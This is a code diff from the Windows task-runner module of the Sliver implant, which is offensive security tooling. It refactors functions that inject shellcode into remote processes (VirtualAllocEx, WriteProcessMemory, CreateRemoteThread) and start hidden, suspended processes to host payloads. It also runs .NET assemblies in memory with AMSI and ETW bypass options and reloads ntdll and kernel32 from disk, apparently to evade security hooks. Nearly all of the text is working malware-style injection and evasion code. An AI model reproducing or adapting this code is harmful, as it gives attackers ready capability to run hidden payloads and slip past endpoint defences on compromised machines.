@@ -1,3 +1,5 @@
+//+build windows
+
 package taskrunner
 
 /*
@@ -20,218 +22,54 @@ package taskrunner
 
 import (
 	"bytes"
-	"debug/pe"
-	"fmt"
-	"io"
-	"io/ioutil"
+	"encoding/binary"
+
 	// {{if .Debug}}
 	"log"
 	// {{else}}{{end}}
-	"os"
 	"os/exec"
 	"runtime"
 	"strings"
-	"syscall"
 	"time"
 	"unsafe"
 
+	"syscall"
+	// {{if .Evasion}}
+	"github.com/bishopfox/sliver/sliver/evasion"
 	"github.com/bishopfox/sliver/sliver/version"
+
+	// {{end}}
+
+	"github.com/bishopfox/sliver/sliver/syscalls"
+	"golang.org/x/sys/windows"
 )
 
 const (
-	MEM_COMMIT          = 0x001000
-	MEM_RESERVE         = 0x002000
-	BobLoaderOffset     = 0x00000af0
-	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
-	MAX_ASSEMBLY_LENGTH = 1025024
-	STILL_ACTIVE        = 259
+	PROCESS_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
+	STILL_ACTIVE       = 259
 )
 
 var (
-	kernel32               = syscall.MustLoadDLL("kernel32.dll")
-	procVirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
-	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
-	procVirtualProtect     = kernel32.MustFindProc("VirtualProtect")
-	procVirtualProtectEx   = kernel32.MustFindProc("VirtualProtectEx")
-	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
-	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
-	procCreateThread       = kernel32.MustFindProc("CreateThread")
-	procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
-
 	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
 	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
+	CurrentToken    windows.Token
 )
 
-func virtualProtect(lpAddress uintptr, size, newProtect uint, oldProtect unsafe.Pointer) error {
-	r1, _, err := procVirtualProtect.Call(lpAddress, uintptr(size), uintptr(newProtect), uintptr(oldProtect))
-	if uint(r1) == 0 {
-		return err
-	}
-	return nil
-}
-
-func virtualProtectEx(handle syscall.Handle, lpAddress uintptr, size, newProtect uint, oldProtect unsafe.Pointer) error {
-	r1, _, err := procVirtualProtectEx.Call(uintptr(handle), lpAddress, uintptr(size), uintptr(newProtect), uintptr(oldProtect))
-	if uint(r1) == 0 {
-		return err
-	}
-	return nil
-}
-
-func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
-	r1, _, e1 := procVirtualAllocEx.Call(
-		uintptr(process),
-		addr,
-		uintptr(size),
-		uintptr(allocType),
-		uintptr(protect))
-
-	if int(r1) == 0 {
-		return r1, os.NewSyscallError("VirtualAllocEx", e1)
-	}
-	return r1, nil
-}
-
-func writeProcessMemory(process syscall.Handle, addr uintptr, buf unsafe.Pointer, size uint32) (uint32, error) {
-	var nLength uint32
-	r1, _, e1 := procWriteProcessMemory.Call(
-		uintptr(process),
-		addr,
-		uintptr(buf),
-		uintptr(size),
-		uintptr(unsafe.Pointer(&nLength)))
-
-	if int(r1) == 0 {
-		return nLength, os.NewSyscallError("WriteProcessMemory", e1)
-	}
-	return nLength, nil
-}
-
-func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, stackSize uint32, startAddress, parameter uintptr, creationFlags uint32) (syscall.Handle, uint32, error) {
-	var threadID uint32
-	r1, _, e1 := procCreateRemoteThread.Call(
-		uintptr(process),
-		uintptr(unsafe.Pointer(sa)),
-		uintptr(stackSize),
-		startAddress,
-		parameter,
-		uintptr(creationFlags),
-		uintptr(unsafe.Pointer(&threadID)))
-	runtime.KeepAlive(sa)
-	if int(r1) == 0 {
-		return syscall.InvalidHandle, 0, os.NewSyscallError("CreateRemoteThread", e1)
-	}
-	return syscall.Handle(r1), threadID, nil
-}
-
-
-func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
-	var exitCode uint32
-	r1, _, e1 := procGetExitCodeThread.Call(
-		uintptr(threadHandle),
-		uintptr(unsafe.Pointer(&exitCode)))
-	if r1 == 0 {
-		return exitCode, e1
-	}
-	return exitCode, nil
-}
-
 func sysAlloc(size int, rwxPages bool) (uintptr, error) {
-	perms := syscall.PAGE_EXECUTE_READWRITE
+	perms := windows.PAGE_EXECUTE_READWRITE
 	if !rwxPages {
-		perms = syscall.PAGE_READWRITE
+		perms = windows.PAGE_READWRITE
 	}
 	n := uintptr(size)
-	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, uintptr(perms))
+	addr, err := windows.VirtualAlloc(uintptr(0), n, windows.MEM_RESERVE|windows.MEM_COMMIT, uint32(perms))
 	if addr == 0 {
 		return 0, err
 	}
 	return addr, nil
 }
 
-func ptr(val interface{}) uintptr {
-	switch val.(type) {
-	case string:
-		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
-	case int:
-		return uintptr(val.(int))
-	default:
-		return uintptr(0)
-	}
-}
-
-func RefreshPE(name string) error {
-	//{{if .Debug}}
-	log.Printf("Reloading %s...\n", name)
-	//{{end}}
-	df, e := ioutil.ReadFile(name)
-	if e != nil {
-		return e
-	}
-	f, e := pe.Open(name)
-	if e != nil {
-		return e
-	}
-
-	x := f.Section(".text")
-	ddf := df[x.Offset:x.Size]
-	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
-}
-
-func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
-	t, e := syscall.LoadDLL(pn)
-	if e != nil {
-		return e
-	}
-	h := t.Handle
-	dllBase := uintptr(h)
-
-	dllOffset := uint(dllBase) + uint(virtualoffset)
-
-	var old int
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-
-	virtprot := kernel32.NewProc("VirtualProtect")
-	r, _, e := virtprot.Call(
-		uintptr(dllOffset),
-		uintptr(len(b)),
-		uintptr(0x40),
-		uintptr(unsafe.Pointer(&old)),
-	)
-	if int(r) == 0 {
-		return e
-	}
-	//{{if .Debug}}
-	log.Println("Made memory map RWX")
-	//{{end}}
-
-	for i := 0; i < len(b); i++ {
-		loc := uintptr(dllOffset + uint(i))
-		mem := (*[1]byte)(unsafe.Pointer(loc))
-		(*mem)[0] = b[i]
-	}
-
-	//{{if .Debug}}
-	log.Println("DLL overwritten")
-	//{{end}}
-
-	r, _, e = virtprot.Call(
-		uintptr(dllOffset),
-		uintptr(len(b)),
-		uintptr(old),
-		uintptr(unsafe.Pointer(&old)),
-	)
-	if int(r) == 0 {
-		return e
-	}
-	//{{if .Debug}}
-	log.Println("Restored memory map permissions")
-	//{{end}}
-	return nil
-}
-
 // injectTask - Injects shellcode into a process handle
-func injectTask(processHandle syscall.Handle, data []byte, rwxPages bool) error {
+func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error {
 	var (
 		err        error
 		remoteAddr uintptr
@@ -242,9 +80,9 @@ func injectTask(processHandle syscall.Handle, data []byte, rwxPages bool) error 
 	log.Println("allocating remote process memory ...")
 	// {{end}}
 	if rwxPages {
-		remoteAddr, err = virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
+		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	} else {
-		remoteAddr, err = virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
+		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	}
 	// {{if .Debug}}
 	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
@@ -257,7 +95,8 @@ func injectTask(processHandle syscall.Handle, data []byte, rwxPages bool) error 
 	}
 
 	// Write the shellcode into the remotely allocated buffer
-	_, err = writeProcessMemory(processHandle, remoteAddr, unsafe.Pointer(&data[0]), uint32(dataSize))
+	var nLength uintptr
+	err = syscalls.WriteProcessMemory(processHandle, remoteAddr, &data[0], uintptr(uint32(dataSize)), &nLength)
 	// {{if .Debug}}
 	log.Printf("writeprocessmemory returned: err = %v", err)
 	// {{end}}
@@ -268,9 +107,9 @@ func injectTask(processHandle syscall.Handle, data []byte, rwxPages bool) error 
 		return err
 	}
 	if !rwxPages {
-		var oldProtect int
+		var oldProtect uint32
 		// Set proper page permissions
-		err = virtualProtectEx(processHandle, remoteAddr, uint(dataSize), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
 		if err != nil {
 			//{{if .Debug}}
 			log.Println("VirtualProtectEx failed:", err)
@@ -282,8 +121,9 @@ func injectTask(processHandle syscall.Handle, data []byte, rwxPages bool) error 
 	// {{if .Debug}}
 	log.Println("successfully injected data, starting remote thread ....")
 	// {{end}}
-	attr := new(syscall.SecurityAttributes)
-	_, _, err = createRemoteThread(processHandle, attr, 0, uintptr(remoteAddr), 0, 0)
+	attr := new(windows.SecurityAttributes)
+	var lpThreadId uint32
+	_, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
 	// {{if .Debug}}
 	log.Printf("createremotethread returned:  err = %v", err)
 	// {{end}}
@@ -298,27 +138,11 @@ func injectTask(processHandle syscall.Handle, data []byte, rwxPages bool) error 
 
 // RermoteTask - Injects Task into a processID using remote threads
 func RemoteTask(processID int, data []byte, rwxPages bool) error {
-	var err error
-	// Hotfix for #114
-	// Somehow this fucks up everything on Windows 8.1
-	// so we're skipping the RefreshPE calls.
-	if version.GetVersion() != "6.3 build 9600" {
-		err = RefreshPE(ntdllPath)
-		if err != nil {
-			//{{if .Debug}}
-			log.Printf("RefreshPE on ntdll failed: %v\n", err)
-			//{{end}}
-			return err
-		}
-		err = RefreshPE(kernel32dllPath)
-		if err != nil {
-			//{{if .Debug}}
-			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
-			//{{end}}
-			return err
-		}
+	err := refresh()
+	if err != nil {
+		return err
 	}
-	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
+	processHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
 	if processHandle == 0 {
 		return err
 	}
@@ -331,22 +155,9 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 
 func LocalTask(data []byte, rwxPages bool) error {
 	var err error
-	// Hotfix for #114
-	// Somehow this fucks up everything on Windows 8.1
-	// so we're skipping the RefreshPE calls.
-	if version.GetVersion() != "6.3 build 9600" {
-		err = RefreshPE(ntdllPath)
+	if runtime.GOARCH == "amd64" {
+		err = refresh()
 		if err != nil {
-			//{{if .Debug}}
-			log.Printf("RefreshPE on ntdll failed: %v\n", err)
-			//{{end}}
-			return err
-		}
-		err = RefreshPE(kernel32dllPath)
-		if err != nil {
-			//{{if .Debug}}
-			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
-			//{{end}}
 			return err
 		}
 	}
@@ -357,8 +168,8 @@ func LocalTask(data []byte, rwxPages bool) error {
 		buf[index] = data[index]
 	}
 	if !rwxPages {
-		var oldProtect int
-		err = virtualProtect(addr, uint(size), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+		var oldProtect uint32
+		err = windows.VirtualProtect(addr, uintptr(size), windows.PAGE_EXECUTE_READ, &oldProtect)
 		if err != nil {
 			//{{if .Debug}}
 			log.Println("VirtualProtect failed:", err)
@@ -369,16 +180,15 @@ func LocalTask(data []byte, rwxPages bool) error {
 	// {{if .Debug}}
 	log.Printf("creating local thread with start address: 0x%08x", addr)
 	// {{end}}
-	_, _, err = procCreateThread.Call(0, 0, addr, 0, 0, 0)
+	var lpThreadId uint32
+	_, err = syscalls.CreateThread(nil, 0, addr, uintptr(0), 0, &lpThreadId)
 	return err
 }
 
-func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeout int32) (string, error) {
-	err := RefreshPE(ntdllPath)
-	if err != nil {
-		return "", err
-	}
-	err = RefreshPE(kernel32dllPath)
+func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi bool, etw bool, offset uint32) (string, error) {
+	assemblySizeArr := convertIntToByteArr(len(assembly))
+	paramsSizeArr := convertIntToByteArr(len(params) + 1)
+	err := refresh()
 	if err != nil {
 		return "", err
 	}
@@ -386,19 +196,8 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	log.Println("[*] Assembly size:", len(assembly))
 	log.Println("[*] Hosting dll size:", len(hostingDll))
 	// {{end}}
-	if len(assembly) > MAX_ASSEMBLY_LENGTH {
-		return "", fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
-	}
-	cmd := exec.Command(process)
-	cmd.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow: true,
-	}
 	var stdoutBuf, stderrBuf bytes.Buffer
-	stdoutIn, _ := cmd.StdoutPipe()
-	stderrIn, _ := cmd.StderrPipe()
-
-	var errStdout, errStderr error
-	err = cmd.Start()
+	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
 	if err != nil {
 		//{{if .Debug}}
 		log.Println("Could not start process:", process)
@@ -409,71 +208,185 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	// {{if .Debug}}
 	log.Printf("[*] %s started, pid = %d\n", process, pid)
 	// {{end}}
-	// OpenProcess with PROC_ACCESS_ALL
-	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
+	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
 	if err != nil {
 		return "", err
 	}
-	// VirtualAllocEx to allocate a new memory segment into the target process
-	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
-	if err != nil {
-		return "", err
-	}
-	// WriteProcessMemory to write the reflective loader into the process
-	_, err = writeProcessMemory(handle, hostingDllAddr, unsafe.Pointer(&hostingDll[0]), uint32(len(hostingDll)))
+	defer windows.CloseHandle(handle)
+	hostingDllAddr, err := allocAndWrite(hostingDll, handle, uint32(len(hostingDll)))
 	if err != nil {
 		return "", err
 	}
 	// {{if .Debug}}
 	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
 	// {{end}}
-	// Total size to allocate = assembly size + 1024 bytes for the args
-	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
-	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
-	assemblyAddr, err := virtualAllocEx(handle, 0, totalSize, MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
-	if err != nil {
-		return "", err
+
+	// 4 bytes Assembly Size
+	// 4 bytes Params Size
+	// 1 byte AMSI bool  0x00 no  0x01 yes
+	// 1 byte ETW bool  0x00 no  0x01 yes
+	// parameter bytes
+	// assembly bytes
+	payload := append(assemblySizeArr, paramsSizeArr...)
+	if amsi {
+		payload = append(payload, byte(1))
+	} else {
+		payload = append(payload, byte(0))
 	}
-	// Padd arguments with 0x00 -- there must be a cleaner way to do that
-	paramsBytes := []byte(params)
-	padding := make([]byte, 1024-len(params))
-	final := append(paramsBytes, padding...)
-	// Final payload: params + assembly
-	final = append(final, assembly...)
-	// WriteProcessMemory to write the .NET assembly + args
-	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&final[0]), uint32(len(final)))
+	if etw {
+		payload = append(payload, byte(1))
+	} else {
+		payload = append(payload, byte(0))
+	}
+	payload = append(payload, []byte(params)...)
+	payload = append(payload, '\x00')
+	payload = append(payload, assembly...)
+	totalSize := uint32(len(payload))
+	assemblyAddr, err := allocAndWrite(payload, handle, totalSize)
 	if err != nil {
 		return "", err
 	}
 	// {{if .Debug}}
-	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
+	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
 	// {{end}}
-	// Apply R-X perms
-	var oldProtect int
-	err = virtualProtectEx(handle, hostingDllAddr, uint(len(hostingDll)), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
-	if err != nil {
-		//{{if .Debug}}
-		log.Println("VirtualProtectEx failed:", err)
-		//{{end}}
-		return "", err
-	}
-	// CreateRemoteThread(DLL addr + offset, assembly addr)
-	attr := new(syscall.SecurityAttributes)
-	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
+	threadHandle, err := protectAndExec(handle, hostingDllAddr, uintptr(hostingDllAddr)+uintptr(offset), assemblyAddr, uint32(len(hostingDll)))
 	if err != nil {
 		return "", err
 	}
 	// {{if .Debug}}
 	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
 	// {{end}}
+	err = waitForCompletion(threadHandle)
+	if err != nil {
+		return "", err
+	}
+	err = cmd.Process.Kill()
+	if err != nil {
+		// {{if .Debug}}
+		log.Println("Error kill: %v\n", err)
+		// {{end}}
+		return "", err
+	}
+	return stdoutBuf.String() + stderrBuf.String(), nil
+}
+
+func SpawnDll(procName string, data []byte, offset uint32, args string) (string, error) {
+	err := refresh()
+	if err != nil {
+		return "", err
+	}
+	var stdoutBuff bytes.Buffer
+	var stderrBuff bytes.Buffer
+	// 1 - Start process
+	cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff, true)
+	if err != nil {
+		return "", err
+	}
+	pid := cmd.Process.Pid
+	// {{if .Debug}}
+	log.Printf("[*] %s started, pid = %d\n", procName, pid)
+	// {{end}}
+	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
+	if err != nil {
+		return "", err
+	}
+	defer windows.CloseHandle(handle)
+	dataAddr, err := allocAndWrite(data, handle, uint32(len(data)))
+	argAddr := uintptr(0)
+	if len(args) > 0 {
+		//{{if .Debug}}
+		log.Printf("Args: %s\n", args)
+		//{{end}}
+		argsArray := []byte(args)
+		argAddr, err = allocAndWrite(argsArray, handle, uint32(len(argsArray)))
+		if err != nil {
+			return "", err
+		}
+	}
+	//{{if .Debug}}
+	log.Printf("[*] Args addr: 0x%08x\n", argAddr)
+	//{{end}}
+	startAddr := uintptr(dataAddr) + uintptr(offset)
+	threadHandle, err := protectAndExec(handle, dataAddr, startAddr, argAddr, uint32(len(data)))
+	if err != nil {
+		return "", err
+	}
+	// {{if .Debug}}
+	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
+	// {{end}}
+
+	err = waitForCompletion(threadHandle)
+	if err != nil {
+		return "", err
+	}
+	cmd.Process.Kill()
+	return stdoutBuff.String() + stderrBuff.String(), nil
+}
+
+//SideLoad - Side load a binary as shellcode and returns its output
+func Sideload(procName string, data []byte, args string) (string, error) {
+	return SpawnDll(procName, data, 0, "")
+}
+
+// Util functions
+func refresh() error {
+	// Hotfix for #114
+	// Somehow this fucks up everything on Windows 8.1
+	// so we're skipping the RefreshPE calls.
+	// {{if .Evasion}}
+	if version.GetVersion() != "6.3 build 9600" {
+		err := evasion.RefreshPE(ntdllPath)
+		if err != nil {
+			//{{if .Debug}}
+			log.Printf("RefreshPE on ntdll failed: %v\n", err)
+			//{{end}}
+			return err
+		}
+		err = evasion.RefreshPE(kernel32dllPath)
+		if err != nil {
+			//{{if .Debug}}
+			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
+			//{{end}}
+			return err
+		}
+	}
+	// {{end}}
+	return nil
+}
+
+func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
+	cmd := exec.Command(proc)
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(CurrentToken),
+	}
+	cmd.Stdout = stdout
+	cmd.Stderr = stderr
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		HideWindow: true,
+	}
+	if suspended {
+		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
+	}
+	err := cmd.Start()
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("Could not start process:", proc)
+		//{{end}}
+		return nil, err
+	}
+	return cmd, nil
+}
+
+func waitForCompletion(threadHandle windows.Handle) error {
 	for {
-		code, err := getExitCodeThread(threadHandle)
+		var code uint32
+		err := syscalls.GetExitCodeThread(threadHandle, &code)
 		// log.Println(code)
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
 			// {{if .Debug}}
 			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
 			// {{end}}
-			return "", err
+			return err
 		}
 		if code == STILL_ACTIVE {
 			time.Sleep(time.Second)
@@ -481,22 +394,47 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 			break
 		}
 	}
-	cmd.Process.Kill()
-	go func() {
-		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
-	}()
-	_, errStderr = io.Copy(&stderrBuf, stderrIn)
+	return nil
+}
 
-	if errStdout != nil {
-		return "", errStdout
+func allocAndWrite(data []byte, handle windows.Handle, size uint32) (dataAddr uintptr, err error) {
+	// VirtualAllocEx to allocate a new memory segment into the target process
+	dataAddr, err = syscalls.VirtualAllocEx(handle, uintptr(0), uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		return
 	}
-	if errStderr != nil {
-		return "", errStderr
+	// WriteProcessMemory to write the reflective loader into the process
+	var nLength uintptr
+	err = syscalls.WriteProcessMemory(handle, dataAddr, &data[0], uintptr(uint32(len(data))), &nLength)
+	if err != nil {
+		return
 	}
-	outStr, _ := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
-	// {{if .Debug}}
-	log.Println("[*] Output:")
-	log.Println(outStr)
-	// {{end}}
-	return outStr, nil
+	return
+}
+
+func protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr uintptr, argAddr uintptr, dataLen uint32) (threadHandle windows.Handle, err error) {
+	var oldProtect uint32
+	err = syscalls.VirtualProtectEx(handle, startAddr, uintptr(dataLen), windows.PAGE_EXECUTE_READ, &oldProtect)
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("VirtualProtectEx failed:", err)
+		//{{end}}
+		return
+	}
+	attr := new(windows.SecurityAttributes)
+	var lpThreadId uint32
+	//{{if .Debug}}
+	log.Printf("Starting thread at 0x%08x\n", startAddr)
+	//{{end}}
+	threadHandle, err = syscalls.CreateRemoteThread(handle, attr, 0, threadStartAddr, argAddr, 0, &lpThreadId)
+	if err != nil {
+		return
+	}
+	return
+}
+
+func convertIntToByteArr(num int) []byte {
+	buff := make([]byte, 4)
+	binary.LittleEndian.PutUint32(buff, uint32(num))
+	return buff
 }
